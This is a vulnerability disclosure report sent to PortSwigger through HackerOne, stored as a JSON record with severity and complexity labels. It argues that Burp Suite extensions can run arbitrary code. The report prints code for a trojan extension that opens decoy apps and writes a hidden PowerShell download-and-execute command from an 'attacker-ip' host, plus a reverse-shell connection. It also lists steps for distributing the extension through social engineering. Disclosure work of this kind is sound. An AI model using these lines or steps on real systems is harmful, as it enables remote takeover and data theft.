{
    "reported_to": "PortSwigger Web Security",
    "reported_by": "iamunixtz ",
    "title": "Burp Suite extensions can execute arbitrary code",
    "content": "\nDear PortSwigger Security Team,\nI hope you\u2019re doing well. I\u2019m reaching out to share a security concern regarding Burp Suite\u2019s extension framework that could allow an attacker to compromise a machine by executing untrusted code. While Burp Suite offers powerful extensibility, this flexibility can also introduce significant security risks if an attacker crafts a malicious extension. This research highlights a attack vector that allows code execution, leading to full system compromise, including reverse shells and persistent access.\nOverview of the Issue\nBurp Suite extensions, when installed and executed, run with the same privileges as the user. This means that an attacker can embed arbitrary system commands inside an extension that, when loaded, will execute malicious payloads. This could include actions such as:\nRunning a reverse shell to an attacker-controlled machine.\nDownloading and executing remote payloads.\nCapturing keystrokes, screenshots, and other sensitive data.\nBypassing security measures by running malicious actions in the background.\nFor this demonstration, I will showcase how an attacker can embed seemingly harmless functionality inside a Burp extension while covertly executing malicious actions in the background.\nDemonstration of the Attack\nTo illustrate this, I created a Burp extension that appears to perform simple tasks such as opening Notepad and Calculator. However, in reality, it also performs the following malicious actions:\nCreates a hidden PowerShell script (poc.ps1).\nExecutes the PowerShell script, which opens a reverse shell to an attacker\u2019s machine.\nOpens a backdoor using nc (Netcat) to maintain persistent access.\nRuns system-level commands, such as accessing the webcam, stealing credentials, or modifying system settings.\nCode Breakdown\nBelow is a breakdown of the extension\u2019s malicious functionality:\nsubprocess.Popen([\"calc.exe\"], shell=True)  # Opens Calculator\nsubprocess.Popen([\"notepad.exe\", \"poc.txt\"], shell=True)  # Opens Notepad with a file\nsubprocess.Popen([\"start\", \"microsoft.windows.camera:\"], shell=True)  # Opens Camera\nfile_path = os.path.join(os.getcwd(), \"burpextension\", \"poc.ps1\")\nwith open(file_path, \"w\") as file:\n    file.write(\"Start-Process powershell -ArgumentList '-NoP -NonI -W Hidden -Exec Bypass -C \\\"IEX(New-Object Net.WebClient).DownloadString(\\'http://attacker-ip:8000/rev.ps1\\')\\\"'\")\nsubprocess.Popen([\"powershell.exe\", \"-ExecutionPolicy\", \"Bypass\", \"-File\", file_path], shell=True)\n$client = New-Object System.Net.Sockets.TCPClient(\"attacker-ip\",4444);\n\nWhile Burp Suite does provide an extension signing feature, many users disable it or install extensions from unverified sources, making them vulnerable.\nFull pwn Poc\nMitigations & Recommendations\nTo address this issue, I propose the following mitigations:\nRestrict System Commands in Extensions\nPrevent direct execution of subprocess.Popen(), os.system(), or PowerShell commands inside extensions.\nIntroduce an API restriction that blocks execution of commands unless explicitly allowed by the user.\nPrevent direct execution of subprocess.Popen(), os.system(), or PowerShell commands inside extensions.\nIntroduce an API restriction that blocks execution of commands unless explicitly allowed by the user.\nExtension Code Review & Sandboxing\nImplement a sandboxing mechanism that restricts what an extension can execute.\nRequire explicit user confirmation before an extension can execute system commands.\nImplement a sandboxing mechanism that restricts what an extension can execute.\nRequire explicit user confirmation before an extension can execute system commands.\nEnforce Digital Signing for Extensions\nRequire all extensions to be signed and verified before execution.\nWarn users when installing unsigned extensions.\nRequire all extensions to be signed and verified before execution.\nWarn users when installing unsigned extensions.\nMonitor and Log Extension Behavior\nImplement logging for all system commands executed by an extension.\nAlert users if an extension attempts to execute unauthorized actions.\nImplement logging for all system commands executed by an extension.\nAlert users if an extension attempts to execute unauthorized actions.\nConclusion\nThis research demonstrates how a malicious Burp Suite extension can be used as a Trojan horse to execute arbitrary system commands, including launching a reverse shell. Given that Burp Suite is widely used by security professionals, pentesters, and even corporate environments, it is critical to enforce stricter controls on extension execution to prevent abuse.\nI appreciate your time in reviewing this report, and I hope this helps improve the security of Burp Suite. Please let me know if you need further details or if I can assist with any additional testing.\nLooking forward to your feedback!\nImpact\nThe primary issue is that Burp Suite extensions execute code with the same privileges as the user. If an attacker manages to convince a target to install a malicious extension, they can:\nGain persistent access to the system.\nExecute arbitrary system commands in the background.\nSteal sensitive data without detection.\nBypass security measures by executing trusted processes (e.g., PowerShell, cmd.exe, or Windows utilities).\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1740595920,
    "report_url": "https://hackerone.com/reports/3014158",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "MEDIUM",
    "vuln_category": "CODE",
    "steps": [
        [
            1,
            "Create a Burp Suite extension that appears benign but contains malicious code (e.g., opening Calculator or Notepad)."
        ],
        [
            2,
            "Embed malicious functionality in the extension, such as creating and executing a hidden PowerShell script that opens a reverse shell to an attacker-controlled machine."
        ],
        [
            3,
            "Package the extension and distribute it to a target user, either through social engineering or unverified sources."
        ],
        [
            4,
            "Once the target installs and runs the extension, the malicious code executes with the user's privileges, compromising the system."
        ]
    ],
    "vuln_description": "Burp Suite extensions can execute arbitrary code with the same privileges as the user, allowing an attacker to craft a malicious extension that performs actions like opening reverse shells, downloading payloads, or stealing sensitive data.",
    "reason": "The vulnerability involves understanding how Burp Suite extensions work and how to embed malicious code within them. The attack requires knowledge of system commands and scripting (e.g., PowerShell), but the core idea of exploiting extension privileges is straightforward once the attacker has the necessary technical skills.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}